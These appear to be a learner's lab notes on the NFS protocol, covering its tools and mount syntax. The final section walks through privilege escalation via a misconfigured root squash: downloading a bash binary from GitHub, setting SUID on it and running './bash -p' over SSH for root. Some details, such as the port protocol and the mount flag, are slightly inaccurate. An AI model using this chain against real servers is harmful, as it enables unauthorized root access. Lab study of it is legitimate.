Default port 2049 (UDP)

- **NFS (Network File System):**
  1. **Distributed File System:** NFS is a distributed file system protocol that allows a user on a client computer to access files over a network as if they were on its local disks.
  2. **Unix and Linux Compatibility:** Originally developed by Sun Microsystems, NFS is commonly used in Unix and Linux environments, providing a standardized way to share files across these systems.
  3. **Versions:** NFS has gone through several versions, with NFSv3 and NFSv4 being widely used. Each version introduces enhancements in performance, security, and features.
  4. **Mounting and Sharing:** NFS enables the mounting of remote directories, allowing them to be accessed as if they were local, promoting collaboration and resource sharing among networked computers.

If Someone wants to access a file with NFS an RPC (Remote Procedure Call)
Parameter for RPC :
-  The file handle
-  The name of the file to be accessed
-  The user's, user ID
-  The user's group ID

Compatible with MacOs -> Unix -> Windows


---
### nfs-common (tool)

Common nfs tools:
- lockd, statd
- showmount
- nfsstat
- gssd
- idmapd
- mount.nfs

**Mounting NFS shares**
```sudo mount -t nfs 10.10.115.32:/home /tmp/mnt -nolock```


| Tag       | Function                                      |
|-----------|-----------------------------------------------|
| sudo      | Run as root                                    |
| mount     | Execute the mount command                      |
| -t nfs    | Type of device to mount, specifying that it's NFS  |
| IP:share  | The IP Address of the NFS server, and the name of the share to mount  |
| -nolock   | Specifies not to use NLM locking               |

---
NFS Exploit


#### Roots-squash (Activated by default so **SECURE ?**):
  - *Default Setting:* Enabled by default on NFS shares.
  - *Prevents Root Access:* Blocks root access to the NFS volume for connecting users.
  - *Assigned User:* Remote root users get assigned the user "nfsnobody."
  - *Least Privileges:* "nfsnobody" has minimal local privileges.
  - *Security Measure:* Intended to enhance security on NFS shares.
  - *Risk of Disabling:* Disabling may allow the creation of SUID bit files.
  - *Security Concern:* This can potentially grant remote users root access.
  - *Caution Needed:* Disabling should be done cautiously due to security implications.


Can permit :

    NFS Access ->
        Gain Low Privilege Shell ->
            Upload Bash Executable to the NFS share ->
                Set SUID Permissions Through NFS Due To Misconfigured Root Squash ->
                    Login through SSH ->
                        Execute SUID Bit Bash Executable ->
                            ROOT ACCESS

Example: 
```wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash```

Into the mounted files from the client computer
Set permission with SUID for the file (as root owner)
``` -rwsr-sr-x 1 root root 1113504 Nov 13 05:12 bash```
With: ```sudo chmod +sx bash```
Log in with SSH into the target
& Run the bash with this argument : ```./bash -p```



